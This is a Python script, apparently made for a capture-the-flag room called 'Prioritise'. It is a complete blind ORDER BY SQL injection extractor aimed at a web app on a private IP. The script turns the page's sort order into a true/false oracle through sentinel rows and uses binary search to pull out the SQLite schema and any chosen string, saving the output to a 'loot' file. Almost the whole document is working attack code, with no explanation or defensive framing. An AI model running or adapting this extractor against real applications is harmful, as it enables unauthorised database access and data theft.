#!/usr/bin/env python3
"""Fast blind ORDER BY SQLi extractor (Prioritise room, SQLite).

Two sentinel rows make the sort order reveal a boolean:
  S1 title=AAAA date=2999-12-31  (title first,  date last)
  S2 title=ZZZZ date=1900-01-01  (title last,   date first)
Injection: ?order=CASE WHEN (<cond>) THEN title ELSE date END
  cond TRUE  -> sorted by title -> first row title == AAAA
  cond FALSE -> sorted by date -> first row title == ZZZZ
No heavy query: ~0.4s per probe.
"""
import urllib.parse, urllib.request, re, sys, time

URL = "http://10.64.172.157/"
SENT_TRUE = "AAAA"
SENT_FALSE = "ZZZZ"

def fetch(order_payload):
    req = urllib.request.Request(URL + "?order=" + urllib.parse.quote(order_payload))
    try:
        return urllib.request.urlopen(req, timeout=15).read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "replace")

def first_title(html):
    if "<tbody>" not in html:
        return None  # error page (no table)
    tbody = html.split("<tbody>")[1].split("</tbody>")[0]
    for row in re.findall(r"<tr>(.*?)</tr>", tbody, re.S):
        texts = [t.strip() for t in re.findall(r">([^<]+)<", row) if t.strip()]
        if texts:
            return texts[0]
    return None

def title_of(order_payload):
    return first_title(fetch(order_payload))

def oracle(cond):
    t = title_of(f"CASE WHEN ({cond}) THEN title ELSE date END")
    return t == SENT_TRUE

def binsearch(cond_template, lo, hi):
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(cond_template(mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract_string(sql_expr):
    ln = binsearch(lambda m: f"length(({sql_expr}))>{m}", 0, 4096)
    print(f"[*] length = {ln}", flush=True)
    out = []
    for i in range(1, ln + 1):
        cp = binsearch(lambda m: f"unicode(substr(({sql_expr}),{i},1))>{m}", 0, 255)
        out.append(chr(cp) if 0 < cp < 1114112 else "?")
        if i % 20 == 0:
            print(f"[*] {''.join(out)}", flush=True)
    return "".join(out)

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "(SELECT sql FROM sqlite_master WHERE name='todos')"
    print(f"[*] Extracting: {target}")
    res = extract_string(target)
    print(f"[+] RESULT: {res}")
    with open("loot/extracted.txt", "a") as f:
        f.write(f"{target} => {res}\n")
